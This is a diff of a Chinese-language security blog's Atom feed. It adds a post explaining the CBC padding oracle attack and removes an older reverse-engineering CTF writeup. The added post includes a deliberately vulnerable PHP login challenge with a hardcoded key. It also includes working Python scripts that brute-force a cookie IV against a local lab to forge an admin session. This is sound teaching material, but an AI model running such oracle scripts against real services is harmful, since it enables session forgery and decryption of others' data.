@@ -39,6 +39,30 @@
   </entry>
   
   <entry>
+    <title>Padding Oracle Attack</title>
+    <link href="https://bufsnake.github.io/Padding-Oracle-Attack.html"/>
+    <id>https://bufsnake.github.io/Padding-Oracle-Attack.html</id>
+    <published>2020-04-23T11:16:57.000Z</published>
+    <updated>2020-04-23T11:16:05.166Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><pre><code class="bash">1、在ECB模式的基础上，增强了块与块之间的联系。2、明文块先与IV XOR运算后，在进行加密，得到的密文充当下一个明文区块的IV...3、明文块填充方式，如果明文为abcd，长度为4，则需要填充12位，12的十六进制为\x0C，在最后加密的明文为abcd\x0C\x0C\x0C\x0C\x0C\x0C\x0C\x0C\x0C\x0C\x0C\x0C</code></pre><h3 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h3><p><img src="/images/pasted-239.png" srcset="/img/loading.gif" alt="upload successful"></p><h3 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h3><p><img src="/images/pasted-240.png" srcset="/img/loading.gif" alt="upload successful"></p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><h4 id="padding-Oracle-attack"><a href="#padding-Oracle-attack" class="headerlink" title="padding Oracle attack"></a>padding Oracle attack</h4><p><code>密文最后一个区块</code>通过<code>block cipher encryption</code>解密，得到<code>中间密文</code>，<code>中间密文</code>与<code>IV</code>异或得到明文。</p><p>如果输入错误的IV，也是可以解密的，但是<code>中间密文</code>和<code>错误的IV</code>异或后得到的填充值可能出现错误，那程序就会抛出(Padding Error)。</p><ul><li>第一步：填充错误</li></ul><p><img src="/images/pasted-241.png" srcset="/img/loading.gif" alt="upload successful"></p><ul><li>第二步：填充正确，填充为01</li></ul><p><img src="/images/pasted-242.png" srcset="/img/loading.gif" alt="upload successful"></p><ul><li>第三步：填充为0202</li></ul><p><img src="/images/pasted-243.png" srcset="/img/loading.gif" alt="upload successful"></p><ul><li><p>后续</p><p>正确的padding值只可能为：<br>1个字节的padding为<strong>0x01</strong><br>2个字节的padding为<strong>0x02,0x02</strong><br>3个字节的padding为<strong>0x03,0x03,0x03</strong><br>4个字节的padding为<strong>0x04,0x04,0x04,0x04</strong></p><p>……</p></li><li><p>以此类推，可以推导出所有的<code>中间密文</code>，<code>中间密文</code>的第一位需要爆破</p></li><li><p>控制<code>IV</code>可以将密文解密成任意明文(现在已知中间密文、可控IV)</p></li></ul><h5 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h5><pre><code class="php">// index.php&lt;?phperror_reporting(0);include(&#39;./key.php&#39;);define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);define(&quot;SECRET_KEY&quot;, $secret_key);session_start();function get_random_token(){    $random_token=&#39;&#39;;    for($i=0;$i&lt;16;$i++){        $random_token.=chr(rand(1,255));    }    return $random_token;}function get_identity(){    $defaultID = &quot;heheda&quot;;    $token = get_random_token();    $_SESSION[&#39;id&#39;] = base64_encode(openssl_encrypt($defaultID, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token));    setcookie(&quot;token&quot;, base64_encode($token));    $_SESSION[&#39;isadmin&#39;] = false;}function is_admin(){    if(isset($_SESSION[&#39;id&#39;])){        $token = base64_decode($_COOKIE[&#39;token&#39;]);        if($id = openssl_decrypt(base64_decode($_SESSION[&#39;id&#39;]), METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token)){            if($id == &quot;admin&quot;)                $_SESSION[&#39;isadmin&#39;] = true;        } else {            die(&quot;Error!&quot;);        }    }}if(!isset($_SESSION[&#39;id&#39;]))    get_identity();else {    is_admin();    if ($_SESSION[&quot;isadmin&quot;]){        echo &quot;You are admin!\n&quot;;        echo $flag;    }else        echo &quot;You are not admin!\n&quot;;}highlight_file(__file__);?&gt;// key.php&lt;?phpsession_start();$secret_key = &#39;teg2f4z5f7f5a2c1&#39;;$flag = &quot;flag{padding_oracle_attack_is_easy}&quot;;?&gt;</code></pre><ul><li><p>分析代码，可以看到关键点</p><p><img src="/images/pasted-244.png" srcset="/img/loading.gif" alt="upload successful"></p><p>解密时，如果出现Padding Error，则网页会显示Error!，否则会判断解密后的明文是否为admin。</p></li><li><p>判断<code>中间密文</code>的最后一字节</p><pre><code class="python">import requestsimport base64url = &#39;http://127.0.0.1/index.php&#39;for i in range(1,256):    token = &#39;\x00&#39;*15 + chr(i)    cookie = {&#39;token&#39;:base64.b64encode(token).replace(&quot;=&quot;,&quot;%3d&quot;).replace(&#39;/&#39;,&#39;%2f&#39;).replace(&#39;+&#39;,&#39;%2B&#39;),&quot;PHPSESSID&quot;:&quot;gaqekj8shscuprbvdfim9hcgj0&quot;}    if &quot;Error!&quot; not in requests.get(url,cookies=cookie).content:        print hex(i)</code></pre><p><img src="/images/pasted-245.png" srcset="/img/loading.gif" alt="upload successful"></p><p>这样就可以知道中间密文的最后一字节为0x3b ^ 0x1 = 0x3a</p></li><li><p>判断<code>中间密文</code>的倒数第二个字节</p><pre><code class="python">import requestsimport base64url = &#39;http://127.0.0.1/index.php&#39;for i in range(1,256):    token = &#39;\x00&#39;*14 + chr(i) + chr(0x3b^0x1^0x2)    cookie = {&#39;token&#39;:base64.b64encode(token).replace(&quot;=&quot;,&quot;%3d&quot;).replace(&#39;/&#39;,&#39;%2f&#39;).replace(&#39;+&#39;,&#39;%2B&#39;),&quot;PHPSESSID&quot;:&quot;gaqekj8shscuprbvdfim9hcgj0&quot;}    if &quot;Error!&quot; not in requests.get(url,cookies=cookie).content:        print hex(i)</code></pre><p><img src="/images/pasted-246.png" srcset="/img/loading.gif" alt="upload successful"></p><p>这样就可以知道中间密文的最后一字节为0x1a ^ 0x2 = 0x18</p></li><li><p>判断<code>中间密文</code>的倒数第三个字节</p><pre><code class="python">import requestsimport base64url = &#39;http://127.0.0.1/index.php&#39;for i in range(1,256):    token = &#39;\x00&#39;*13 + chr(i) + chr(0x1a^0x2^0x3) + chr(0x3b^0x1^0x2^0x2^0x3)    cookie = {&#39;token&#39;:base64.b64encode(token).replace(&quot;=&quot;,&quot;%3d&quot;).replace(&#39;/&#39;,&#39;%2f&#39;).replace(&#39;+&#39;,&#39;%2B&#39;),&quot;PHPSESSID&quot;:&quot;gaqekj8shscuprbvdfim9hcgj0&quot;}    if &quot;Error!&quot; not in requests.get(url,cookies=cookie).content:        print hex(i)</code></pre><p><img src="/images/pasted-247.png" srcset="/img/loading.gif" alt="upload successful"></p><p>这样就可以知道中间密文的最后一字节为0xd2 ^ 0x3 = 0xd1</p></li><li><p>以此类推</p><pre><code class="python">import requestsimport base64url = &#39;http://127.0.0.1/index.php&#39;token_temp = &#39;&#39;for j in range(1,17):    for i in range(1,256):        token = &#39;\x00&#39;*(16-j) + chr(i) + token_temp        cookie = {&#39;token&#39;:base64.b64encode(token).replace(&quot;=&quot;,&quot;%3d&quot;).replace(&#39;/&#39;,&#39;%2f&#39;).replace(&#39;+&#39;,&#39;%2B&#39;),&quot;PHPSESSID&quot;:&quot;gaqekj8shscuprbvdfim9hcgj0&quot;}        if &quot;Error!&quot; not in requests.get(url,cookies=cookie).content:            token_temp = chr(i ^ j ^ (j+1)) + token_temp            temp = &#39;&#39;            for i in range(1,len(token_temp)):                temp += chr(ord(token_temp[i]) ^ j ^ (j+1))            token_temp = token_temp[0] + temp            breakmiddle = &#39;&#39;for i in range(len(token_temp)):    middle += chr(ord(token_temp[i]) ^ 16)for i in range(1,256):    temp_middle = chr(i) + middle    plain = &#39;admin&#39; + &#39;\x0b&#39;*11    token = &#39;&#39;    for i in range(len(plain)):        token += chr(ord(temp_middle[i]) ^ ord(plain[i]))    cookie = {&#39;token&#39;:base64.b64encode(token).replace(&quot;=&quot;,&quot;%3d&quot;).replace(&#39;/&#39;,&#39;%2f&#39;).replace(&#39;+&#39;,&#39;%2B&#39;),&quot;PHPSESSID&quot;:&quot;gaqekj8shscuprbvdfim9hcgj0&quot;}    if &#39;admin&#39; in requests.get(url,cookies=cookie).content:        print requests.get(url,cookies=cookie).content        break</code></pre><p><img src="/images/pasted-248.png" srcset="/img/loading.gif" alt="upload successful"></p></li></ul>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;1、在ECB模式的基础上，增强了块与块之间的联系。
+2、明文块先与IV XOR运算后，在进行加密，
+      
+    
+    </summary>
+    
+    
+      <category term="padding oracle attack" scheme="https://bufsnake.github.io/tags/padding-oracle-attack/"/>
+    
+  </entry>
+  
+  <entry>
     <title>Mac 自动操作的极致体验</title>
     <link href="https://bufsnake.github.io/Mac-%E8%87%AA%E5%8A%A8%E6%93%8D%E4%BD%9C%E7%9A%84%E6%9E%81%E8%87%B4%E4%BD%93%E9%AA%8C.html"/>
     <id>https://bufsnake.github.io/Mac-自动操作的极致体验.html</id>
@@ -517,33 +541,6 @@
     
     
       <category term="web" scheme="https://bufsnake.github.io/tags/web/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>jactf-reverse3</title>
-    <link href="https://bufsnake.github.io/%E6%8E%98%E5%AE%89RE_crypto.html"/>
-    <id>https://bufsnake.github.io/掘安RE_crypto.html</id>
-    <published>2019-08-16T11:55:57.000Z</published>
-    <updated>2019-11-25T09:42:53.216Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="RE-crypto"><a href="#RE-crypto" class="headerlink" title="RE_crypto"></a>RE_crypto</h3><p><img src="/images/pasted-109.png" srcset="/img/loading.gif" alt="upload successful"></p><h4 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h4><p><img src="/images/pasted-110.png" srcset="/img/loading.gif" alt="upload successful"></p><p><img src="/images/pasted-111.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>程序逻辑不难，输入的字符作为unk_4021A0数组的下标，定位该下标所对应的值，与((v11 + v12) ^ 0x19)比较，这个值是可以自己算出来的</p></blockquote><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><pre><code class="python">byte1=[0x32,0x61,0x34,0x39,0x66,0x36,0x39,0x63,0x33,0x38,0x33,0x39,0x35,0x63,0x64,0x65,0x39,0x36,0x64,0x36,0x64,0x65,0x39,0x36,0x64,0x36,0x66,0x34,0x65,0x30,0x32,0x35,0x34,0x38,0x34,0x39,0x35,0x34,0x64,0x36,0x31,0x39,0x35,0x34,0x34,0x38,0x64,0x65,0x66,0x36,0x65,0x32,0x64,0x61,0x64,0x36,0x37,0x37,0x38,0x36,0x65,0x32,0x31,0x64,0x35,0x61,0x64,0x61,0x65,0x36]byte = [ 0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76, 0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0, 0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15, 0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75, 0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84, 0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF, 0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8, 0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2, 0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73, 0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB, 0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79, 0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08, 0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A, 0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E, 0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF, 0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16]ans = &quot;&quot;for i in range(0,len(byte1),2):    v9 = 0    v10 = 0    if byte1[i] &lt; 48 or byte1[i] &gt; 57:        v9 = byte1[i] - 87    else:        v9 = byte1[i] - 48    if byte1[i+1] &lt; 48 or byte1[i+1] &gt; 57:        v10 = byte1[i+1] - 87    else:        v10 = byte1[i+1] - 48    flag = (16*v9+v10) ^ 0x19    for j in range(0,len(byte)):        if flag == byte[j]:            ans += chr(j)print ans</code></pre><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote><p>看了encrypt，只理解了一小部分，后面的部分实在不太明白到底是干嘛，还是太菜了，近几天做的逆向题目，让我深刻认识到密码学、算法(acm)在逆向中的重要地位，一步一个jio印吧……</p></blockquote>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h3 id=&quot;RE-crypto&quot;&gt;&lt;a href=&quot;#RE-crypto&quot; class=&quot;headerlink&quot; title=&quot;RE_crypto&quot;&gt;&lt;/a&gt;RE_crypto&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/images/pasted-109.png&quot; srcset=&quot;
-      
-    
-    </summary>
-    
-      <category term="reverse" scheme="https://bufsnake.github.io/categories/reverse/"/>
-    
-    
-      <category term="writeup" scheme="https://bufsnake.github.io/tags/writeup/"/>
-    
-      <category term="jactf" scheme="https://bufsnake.github.io/tags/jactf/"/>
     
   </entry>
   
